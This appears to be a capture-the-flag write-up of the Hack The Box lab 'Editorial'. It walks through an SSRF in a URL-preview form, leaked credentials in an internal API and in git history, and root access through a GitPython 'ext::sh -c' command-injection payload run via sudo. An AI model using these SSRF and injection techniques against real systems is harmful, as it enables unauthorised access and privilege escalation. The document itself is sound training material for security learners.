---
title: "Editorial"
tags:
    - machine
date: "2024-10-19"
thumbnail: "/assets/img/thumbnail/Editorial.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Editorial.png" alt="Editorial">

# Solution
---
## Recon
---

Applying nmap scan

```bash
Nmap scan report for 10.10.11.20
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
we see that there's a web service on port 80 and there's a domain editorial.htb should be submitted in `/etc/hosts` file
when we add the domain to /etc/hosts we can visit the site now
<img src="/assets/img/htb/editorial/capture.png">

I tried directory brute forcing
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/editorial]
└─$ feroxbuster -u http://editorial.htb
```
I got no interesting output

I also tried subdomain enumeration
```bash
┌──(youssif㉿youssif)-[~]
└─$  ffuf -u http://10.10.11.20 -H "Host: FUZZ.editorial.htb" -w ~/Desktop/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```
I got no interesting output


## Shell as dev
---

When we navigate the site and go to `Publish with us` tab we will go to `/upload` endpoint and we will see this form.
<img src="/assets/img/htb/editorial/capture1.png">
Preview option is interesting because it has a field that accepts url.
i set up a listener at port 4444 and put `http://myIP:4444` at this field and sent the request and i got a response.
<img src="/assets/img/htb/editorial/capture2.png">

Let's cook this SSRF.
i tried to put `http://127.0.0.1` as a URL, but i get this response.
<img src="/assets/img/htb/editorial/capture3.png">
The path provided in the response isn't very interesting, so i tried to fuzz the target's port as i may find any local port for the target open.
I changed the url to `http://127.0.0.1:FUZZ` and saved the request to file.
then i ran this command.
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/editorial]
└─$ ffuf -request req -request-proto http -w <(seq 1 65535)
```
I found that all the ports return response with the same size which is 61, so i filtered it out and my new command is:
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/editorial]
└─$ ffuf -request req2 -request-proto http -w <(seq 1 65535) -fs 61
```
`-fs 61` : means filter out by size (don't show result whose response size is 61)
that gave me result on port 5000 only, so i sent the request with this url `http://127.0.0.1:5000` and i got this
<img src="/assets/img/htb/editorial/capture4.png">
The response is different now, and when i visit this endpoint i got file with json data whose content is
```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
There are many endpoints, but `/api/latest/metadata/messages/authors` seems to be the most interesting one i will start by it and i will send the request of preview again but the url will be `http://127.0.0.1:5000/api/latest/metadata/messages/authors`

I also got a path to file under uplaods directory and when i visit it i get its content which is
```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```
Nice we have a credentials here `dev:dev080217_devAPI!@`
Let's SSH and get the user flag.
```bash
dev@editorial:~$ cat user.txt 
*****************************f9d
```

## Shell as prod
---

when we get into the machine we will find that we have 2 users
```bash
dev@editorial:~$ ls /home
dev  prod
```

I started navigating within the machine
```bash
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cd apps/
dev@editorial:~/apps$ ll
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 ./
drwxr-x--- 5 dev dev 4096 Oct 16 13:45 ../
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git/
```
I found `.git` directory which indicates that there's a git repositry here.
Let's examine it.
```bash
dev@editorial:~/apps$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    app_api/app.py
        deleted:    app_editorial/app.py
        deleted:    app_editorial/static/css/bootstrap-grid.css
            <SNIP>
```
i found many deleted files but the most interesting files were `app_api/app.py`& `app_editorial/app.py`
i got these files using `git restore <path/to/file>` and read them.

- `app_editorial/app.py`: it's the main app on port 80 and wasn't interesting
- `app_api/app.py`: it's the api on port 5000 we saw and it contains the message we got before which has dev account credentials.

more enumeration in the repo
```bash
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```

There's a commit with a message `downgrading prod to dev` which seems to be very interesting, Let's get the difference between it and the earlier one.

We have many commits let's get the difference using `git diff first-commit second-commit`
I found the a message similer to what we got before but the credentials are for prod user
<img src="/assets/img/htb/editorial/capture5.png">

credentials `prod:080217_Producti0n_2023!@`

Let's SSH as prod

## Shell as root
---
Let's do some enumeration to see the capabilities of `prod` user
```bash
prod@editorial:~$ sudo -l
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
we see that there's a python script which can be executed as root and we can pass any parameter

Let's look at that script
```py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
After examining the code and searching i found this <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">article</a>
This CVE exists on GitPython package if the version is below 3.1.30

Let's check the version of GitPython on the machine we hacked
```bash
prod@editorial:~$ pip3 list | grep Git
GitPython             3.1.29
```
So it's vulnerable

according to the article we provided i used the payload `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'` and when i check the file i see it's created
```bash
prod@editorial:~$ ll /tmp/pwned
-rw-r--r-- 1 root root 0 Oct 19 08:51 /tmp/pwned
```

The executed command is done blindly so if we want to see the result of command we can redirect it to a file and read that file like using the command `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c whoami% >% /tmp/pwned'`
but why we use `%` ?? after searching i found that it's used to bypass some filteration but i didn't find an absolute reason at the end the most logical reason i found from the searches that it maybe encoded as space.

When we read the file now we will get this
```bash
prod@editorial:~$ cat /tmp/pwned 
root
```

we can now get the root flag using `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/pwned'`
then read this file

```bash
prod@editorial:~$ cat /tmp/pwned 
*****************************549
```

GG !!